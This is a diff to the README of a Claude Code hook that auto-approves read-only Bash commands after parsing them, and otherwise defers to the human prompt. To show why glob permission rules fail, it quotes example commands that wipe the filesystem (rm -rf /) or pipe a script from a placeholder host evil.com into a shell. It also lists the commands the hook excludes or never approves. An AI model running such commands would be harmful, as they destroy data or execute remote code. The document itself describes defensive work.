@@ -4,6 +4,70 @@ A [Claude Code hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that 
 
 **Zero-config works.** Install the hook and it immediately approves common read-only commands (`ls`, `cat`, `grep`, `find`, `sort`, `wc`, `jq`, `rg`, `git log`, etc.) while leaving everything else to the interactive prompt.
 
+## Why this exists
+
+Claude Code's [permission system](https://docs.anthropic.com/en/docs/claude-code/security) asks for approval before running Bash commands. You can auto-approve specific patterns with `permissions.allow` rules like `Bash(git status*)` — but the `*` is a simple glob, not a shell-aware parser. `git status*` matches `git status` but it also matches `git status; rm -rf /` and `git status && curl evil.com | sh`. Glob patterns are fundamentally broken as a safety boundary for shell commands.
+
+This leaves you with two choices: approve Bash broadly (and accept the risk of unintended side effects during agentic sessions), or approve nothing (and click through dozens of permission prompts for `ls`, `cat`, `grep`, and `git diff`).
+
+This hook provides a third option: **shell-aware auto-approval**. It uses [bashlex](https://pypi.org/project/bashlex/) to parse commands into a proper AST, walks the tree to extract every executable, and evaluates each one through a deterministic safety pipeline. Pipelines, compound commands, subshells, substitutions, and control flow are all understood structurally — not matched as strings.
+
+The concern that motivated this isn't security against a malicious agent. It's **preventing unintended consequences** during autonomous agentic work. Agents make mistakes. A proper parser catches `ls && rm -rf /` that a glob pattern would let through, while still auto-approving the `ls -la | sort | head -20` pipelines that make up the bulk of agentic Bash usage.
+
+## How it works
+
+```
+  Bash command from Claude Code
+              |
+              v
+      bashlex AST parser
+              |
+              v
+      recursive AST walk
+              |
+              v
+  flat list of CommandFragments
+              |
+              v
+  +-----------+------------+
+  | 7-step evaluation      |
+  | pipeline (per fragment) |
+  |                         |
+  | 1. output redirect?     |  --> fall through
+  | 2. normalize/unwrap     |
+  | 3. never-approve list?  |  --> fall through
+  | 4. dangerous mode?      |  --> fall through
+  | 5. subcommand check     |  --> approve or fall through
+  | 6. whitelist check      |  --> approve
+  | 7. default              |  --> fall through
+  +-------------------------+
+              |
+       ALL fragments pass?
+        /              \
+      yes               no
+       |                 |
+    APPROVE          exit 0, no output
+  (JSON to CC)     (CC shows normal prompt)
+```
+
+The hook **never denies** — it either auto-approves or silently defers to the human. If bashlex fails to parse a command, if the hook encounters unrecognized shell syntax, if the process crashes — the user just sees a normal permission prompt. Fail-open by design.
+
+### Philosophy
+
+**Never block, only approve or defer.** The hook never uses exit code 2 (hard deny). Every rejection is a silent fall-through. This is the same principle as [agent-tooluse-auditor](https://github.com/aelronatline5/agent-tooluse-auditor): the human is always the final authority, and automation only removes friction for obviously safe operations.
+
+**Default-deny for commands.** Any command not explicitly whitelisted falls through at step 7. The whitelist is opt-in: ~60 commands ship by default, and you can add more via config. But the default answer is always "ask the human."
+
+**Security invariants are code, not config.** The never-approve list (shells, interpreters, `eval`, `sudo`), wrapper command handling, and handler dispatch logic are hardcoded. These aren't user preferences — they're escape hatches that can bypass the entire safety model. You can add commands to the whitelist, but you can't remove `bash` from the never-approve list via a JSON key.
+
+**Convention over configuration.** Zero-config works out of the box. The config surface is intentionally small: add commands, remove commands, toggle feature flags. Everything else is baked in. Users specify only deltas from the defaults.
+
+**Two-stage architecture for extensibility.** Parsing (knows shell syntax, knows nothing about safety) and evaluation (knows about command safety, knows nothing about shell syntax) are deliberately separated by the `CommandFragment` interface. New safety rules are added by extending the pipeline — new steps, new handlers, new feature flags — without touching the parser. New shell syntax support is handled in the parser without touching evaluation logic. This separation exists so that the pipeline can evolve from "strictly read-only" toward "sufficiently safe" over time, via progressive feature flags, without architectural changes.
+
+**Progressive trust via feature flags.** The default is strictly read-only. Feature flags opt into broader categories of safe, local, reversible operations: `gitLocalWrites` approves `git add`, `git branch`, `git stash`; `awkSafeMode` approves awk programs that don't use `system()` or output redirection. Each flag has a clear scope and explicit guards (e.g., `git config --global` is always rejected even with `gitLocalWrites` on). Future flags are planned for network reads, safe file writes, and output redirections.
+
+**Deterministic, zero-cost, context-free.** Unlike LLM-based auditors, this hook makes decisions purely from the command string. No API calls, no token costs, no latency beyond Python startup + bashlex parsing (~50-150ms). No session transcript, no "did the user ask for this?" heuristics. The trade-off is that it can't make context-aware judgments — but for the class of commands it handles (read-only operations), context doesn't matter. `ls -la` is safe regardless of who requested it.
+
 ## Requirements
 
 - Python >= 3.10
@@ -158,6 +222,8 @@ Configuration lives inside Claude Code's `settings.json` under the `readonlyBash
 }
 ```
 
+Config lives in `settings.json` rather than a separate file so that Claude Code can edit it naturally via user prompting — it's already a file CC knows how to read and write.
+
 ### Options
 
 | Key | Type | Default | Description |
@@ -248,17 +314,24 @@ assert evaluate_command("kubectl get pods", config) is APPROVE
 
 `git` is handled specially via subcommand analysis (not the whitelist).
 
-## Architecture
+### Commands intentionally excluded
 
-```
-stdin (JSON) → detect event type → bail if not Bash
-  → pre-parse workarounds (strip `time`, rewrite $((...)), [[ ]])
-  → bashlex.parse()
-  → recursive AST walk → flat list of CommandFragments
-  → evaluate every fragment through 7-step pipeline
-  → ALL pass? → emit event-appropriate approval JSON
-  → ANY fail? → exit 0, no output (silent fall-through)
-```
+These aren't on the whitelist and aren't on the never-approve list — they just fall through at step 7:
+
+| Command | Reason |
+|---------|--------|
+| `tee` | Always writes to files |
+| `curl`, `wget` | Network access |
+| `cp`, `mv`, `rm`, `mkdir`, `touch`, `chmod`, `chown` | Obvious writes |
+| `make`, `pip`, `npm`, `cargo`, `docker` | Side-effecting build/install tools |
+| `dd` | Writes via `of=` without shell redirections |
+| `ln`, `install`, `patch` | Modifies filesystem |
+| `truncate`, `shred` | Destructive |
+| `xdg-open`, `open` | Launches external programs |
+| `date` | Read-only without `-s`, but `date -s` sets the clock — excluded for simplicity |
+| `tar` | List mode is read-only, but extract/create write — excluded for simplicity |
+
+## Architecture
 
 ### Two-stage design
 
@@ -290,7 +363,7 @@ class CommandFragment:
 
 At the orchestrator level, fragment-level `REJECT` becomes `FALLTHROUGH` (silent fall-through), never a hard deny.
 
-## Package structure
+### Package structure
 
 ```
 readonly_bash_hook/
@@ -367,6 +440,8 @@ uv run pytest
 # Run tests with coverage
 uv run pytest --cov=readonly_bash_hook --cov-report=term-missing
 ```
+
+636 tests, 99% coverage. The test suite was written independently from the briefing spec, and the implementation was built against the spec without reading test internals — the tests serve as black-box validation.
 
 ## License
 
